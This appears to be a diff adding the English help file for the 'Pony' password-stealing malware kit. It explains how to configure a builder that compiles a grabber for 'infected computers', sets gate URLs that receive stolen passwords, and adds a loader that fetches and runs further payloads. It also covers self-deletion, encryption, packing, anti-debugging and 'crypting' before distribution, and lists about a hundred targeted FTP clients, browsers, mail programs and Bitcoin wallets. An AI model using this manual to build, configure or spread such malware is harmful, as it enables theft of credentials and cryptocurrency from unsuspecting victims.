@@ -1,0 +1,209 @@
+-=- "Pony" password collection system -=-
+
+Builder "PonyBuilder.exe"
+========================
+
+The task of the builder is to configure and compile the client "Pony.exe ", which must be downloaded to infected computers.
+
+Scope of delivery:
+
+* Folder "masm32" - Microsoft Macro Assembler compiler (MASM).
+* Folder "PonySrc" - source code in the MASM language of the client program (grabber) "Pony.exe ".
+* Folder "BuilderSrc" - source code in Delphi 7 of the auxiliary builder program "PonyBuilder.exe ".
+* File "PonyBuilder.exe " - builder program for the client "Pony.exe ".
+* File "Help.txt" - help file.
+* File "build.bat" is the script used by the builder to compile the build from the "PonySrc" sources.
+* The file "Pony.ico" is an icon attached to "Pony.exe" when compiling, if the corresponding option is selected in the builder.
+
+The interface is divided into 4 bookmarks:
+
+1. Builder
+The text field "List of URLs for sending passwords" - here you can register a list of URL gates for sending passwords.
+Each line is a separate URL, for example: http://somedomain.com/dir/gate.php
+You can add an unlimited number of lines (URL), the same URL can be added several times.
+The domain may contain information about the connection port, for example: http://privatedomain.com:8080/gate.php The
+https:// protocol is not supported at the moment.
+"Pony.exe" will try to connect and send a report with passwords on the list if the data is successfully delivered,
+the program will immediately shut down without attempting to connect to the rest of the URLs.
+
+The "Select icon" button allows you to set an icon for the compiled file, only the *.ico format is supported.
+The "Create Build" button compiles the "Pony.exe" with the specified settings.
+
+2. Loader
+A simple loader (file loader). After collecting passwords from the specified links (URLs), files will be downloaded and launched.
+URLs are set in the same way as the list of domains for sending passwords.
+At the bottom of the bookmark, you can set the following options:
+* Activate the loader - enable the loader, otherwise the files will not be downloaded.
+* Do not run the same files twice - after successfully running the downloaded file, a control value will be added to the registry
+(hash) of the file data, after which, when reloading, the duplicate will not be started.
+
+3. Settings
+In order to see all the settings, you need to activate the "Show advanced settings" option in the main menu.
+* Compress - compress reports using the aPLib library, adds about 5Kb to the size of the executable file,
+packs text data well before sending, highly recommended to use, greatly reduces traffic
+to the server.
+* Encrypt - encrypt reports with the RC4 algorithm.
+* Encryption password - the password used to encrypt reports, a similar password must be set in the server settings.
+* Save reports to disk (for debugging) - at startup "Pony.exe ", after the passwords were collected, in the same folder
+where the executable file was launched, the file "out.bin" will be created, this is a container with passwords in the form in which it is sent
+to the server for further processing (decryption).
+* Send empty reports (for statistics) - usually, if no password is found, the client "Pony.exe" send nothing
+the server will not, but sometimes it is useful to enable this option to get statistics on the number of successful launches "Pony.exe ".
+* Debugging mode - removes the exception interceptor, removes code that makes debugging and disassembling of the program difficult, use exclusively for debugging purposes.
+* Send only new reports - if the option is not activated, then duplicate reports with passwords will not be sent.
+* Self-deletion - the running file "Pony.exe" will be deleted after it completes its work.
+* Add Icon - attach the selected icon to the compiled file.
+* Pack the build using UPX - compress the executable file "Pony.exe" after compilation.
+* Number of attempts to send a report - how many times to try to send a report in case of unsuccessful transmission, it is recommended to specify at least 2 attempts
+* Build option:
+* Exe file - a regular Windows executable file (*.exe)
+* Dll file - a build option in the form of .the dll of the library, it is completely autonomous, to work it out, you need to call only the LoadLibrary() API function from your project, i.e. the URL for sending passwords
+and all the settings are sewn into itself .dll file. In the DllTest folder there is a simple example of use-testing, in the same folder you need to put a file Pony.dll , then run the file DllTest.exe,
+which in turn calls LoadLibrary() for .dll libraries.
+
+In the list of "Available decryption modules", you can exclude unnecessary password decryptors from the build, this will reduce the size of the build.
+
+4. Skin
+On this tab, you can choose the skin (skin) of the builder you like.
+
+Launching the builder from the command line
+=================================
+
+The following builder command line arguments are available:
+-PACK_REPORT - compress reports
+-ENCRYPT_REPORT - encrypt reports, if the encryption password is not set, "Mesoamerica" will be specified by default
+-REPORT_PASSWORD= - encryption password, for example: -REPORT_PASSWORD=Mesoamerica
+-SAVE_REPORT - save reports to disk (for debugging)
+-ENABLE_DEBUG_MODE - debugging mode
+-SEND_MODIFIED_ONLY - send only new reports
+-SELF_DELETE - activate self-deletion
+-SEND_EMPTY_REPORTS - send empty reports
+-ADD_ICON - attach an icon from the Pony.ico file
+-UPX - pack the build using UPX
+-DOMAIN_LIST= - a list of domains, each domain should be separated using a special \n symbol, for example: -DOMAIN_LIST=http://host.com/gate.php\nhttp://host2.com/x/gate.php
+-LOADER_LIST= - a list of URLs for the loader (will be activated automatically if there is a URL), each URL should be divided similarly to DOMAIN_LIST
+-LOADER_EXECUTE_NEW_FILES_ONLY - don't run the same files twice
+-DISABLE_MODULE= - exclude a certain decryption module from the build (all module names can be seen in the PonySrc\FTPClients.asm file), for example: -DISABLE_MODULE=MODULE_OPERA
+-DLL_MODE - use the build option as a Dll library
+-COLLECT_HTTP - additionally collect and HTTP/HTTPS passwords
+-COLLECT_EMAIL - additionally collect and E-mail passwords (POP3, IMAP, SMTP)
+-UPLOAD_RETRIES=N - number (N) of attempts to send a report, if no value is specified, then 2 attempts are used by default
+-EXE_RELOCS - Add a Relocation table when assembling as an exe file
+-LOADER_RESERVE_MODE - enable backup download mode: if the first file is successfully downloaded, the rest will be skipped
+-DISABLE_GRABBER - disable password collection, leave the loader functionality.
+
+Client "Pony.exe"
+=================
+
+The task "Pony.exe" - collect passwords from the computer and send them to the server for further processing.
+
+It works on all NT versions of Windows starting from Win98, including server versions. It supports operation in x86 and x64 mode.
+The program normally works when running with administrator or user rights.
+
+Before distributing the file, it is advisable to clean and crypt it.
+
+Instant decryption of saved passwords is implemented for the following programs:
+* FAR Manager
+* Total Commander
+* WS_FTP
+* CuteFTP
+* FlashFXP
+* FileZilla
+* FTP Commander
+* BulletProof FTP
+* SmartFTP
+* TurboFTP
+* FFFTP
+* CoffeeCup FTP
+* CoreFTP
+* FTP Explorer
+* Frigate3 FTP
+* SecureFX
+* UltraFXP
+* FTPRush
+* WebSitePublisher
+* BitKinex
+* ExpanDrive
+* ClassicFTP
+* Fling
+* SoftX
+* Directory Opus
+* FreeFTP
+* DirectFTP (defined as FreeFTP)
+* LeapFTP
+* WinSCP
+* 32bit FTP
+* NetDrive
+* WebDrive
+* FTP Control
+* Opera
+* WiseFTP
+* FTP Voyager
+* Firefox
+* FireFTP
+* SeaMonkey
+* Flock
+* Mozilla Suite Browser
+* LeechFTP
+* Odin Secure FTP Expert
+* WinFTP
+* FTP Surfer
+* FTPGetter
+* ALFTP
+* Internet Explorer
+* Dreamweaver
+* DeluxeFTP
+* Google Chrome
+* Chromium
+* SRWare Iron (defined as Chromium)
+* ChromePlus
+* Bromium (Yandex Chrome)
+* Nichrome
+* Comodo Dragon
+* RockMelt
+* K-Meleon
+* Epic
+* Staff-FTP
+* AceFTP
+* Global Downloader
+* FreshFTP
+* BlazeFTP
+* NETFile
+* GoFTP
+* 3D-FTP
+* Easy FTP
+* Xftp
+* FTP Now
+* Robo-FTP
+* LinasFTP
+* Cyberduck
+* Putty
+* Notepad++ (NppFTP)
+* CoffeeCup Visual Site Designer
+* CoffeeCup Sitemapper (defined as CoffeeCup FTP)
+* FTPShell
+* FTPInfo
+* NexusFile
+* FastStone Browser
+* CoolNovo
+* WinZip
+* Yandex.Internet
+* MyFTP
+* sherrod FTP
+* NovaFTP
+* Windows Mail
+* Windows Live Mail
+* Pocomail
+* Becky!
+* IncrediMail
+* The Bat!
+* Outlook
+* Thunderbird
+* FastTrackFTP
+* Ya Browser
+* Bitcoin
+* Electrum
+* MultiBit
+* FTP Disk
+
+~ Enjoy The Movement!
